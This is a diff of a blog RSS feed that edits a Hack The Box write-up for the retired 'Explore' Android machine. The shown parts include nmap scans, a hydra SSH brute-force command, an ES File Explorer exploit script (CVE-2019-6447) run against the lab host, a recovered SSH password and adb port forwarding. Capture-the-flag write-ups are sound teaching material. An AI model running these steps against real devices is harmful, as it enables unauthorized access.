@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Sat, 30 Oct 2021 19:10:14 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Explore]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Sat, 30 Oct 2021 19:18:15 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Explore]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247
 
 PORT     STATE    SERVICE    VERSION
 2222/tcp open     ssh     (protocol 2.0)
@@ -15,7 +15,7 @@ PORT     STATE    SERVICE    VERSION
 |_    SSH-2.0-SSH Server - Banana Studio
 | ssh-hostkey: 
 |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
-5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered, which most likely means we&apos;ll only be able to access it from inside this machine.</p><p>Let&apos;s focus on the other port: the SSH Server application from &quot;Banana Studio&quot; is &#xA0;<a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (<code>ssh</code> without any password):</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-16.23.28.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="534" height="102"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let&apos;s expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247
+5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered.</p><p>Let&apos;s focus on the other port: the <code>SSH</code> Server application from &quot;Banana Studio&quot; is &#xA0;<a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (&quot;username=<code>ssh</code> without any password&quot;):</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-16.23.28.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="534" height="102"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let&apos;s expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247
 
 2222/tcp open     ssh     (protocol 2.0)
 | fingerprint-strings: 
@@ -36,7 +36,7 @@ PORT     STATE    SERVICE    VERSION
 [+] Done. Saved as `out.dat`.
 
 ~ htb_explore cat out.dat                                           
-f32017174c7c7e8f50c6da52891ae250</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>Let&apos;s continue enumerating using the available commands:</p><pre><code>~ python3 50070.py listPics 10.10.10.247
+f32017174c7c7e8f50c6da52891ae250</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>Let&apos;s continue enumerating using the other available commands for this script:</p><pre><code>~ python3 50070.py listPics 10.10.10.247
 
 ==================================================================
 |    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
@@ -52,7 +52,7 @@ size : 1.14 MB (1,200,401 Bytes)
 &gt; Kr1sT!5h@Rp3xPl0r3!
 
 $ whoami
-u0_a76</code></pre><p>Now that we have access to some SSH credentials, let&apos;s forward the traffic from the machine&apos;s <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
+u0_a76</code></pre><p>Now that we have access to some <code>SSH</code> credentials, let&apos;s forward the traffic from the machine&apos;s <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
 * daemon not running; starting now at tcp:5037
 * daemon started successfully
 
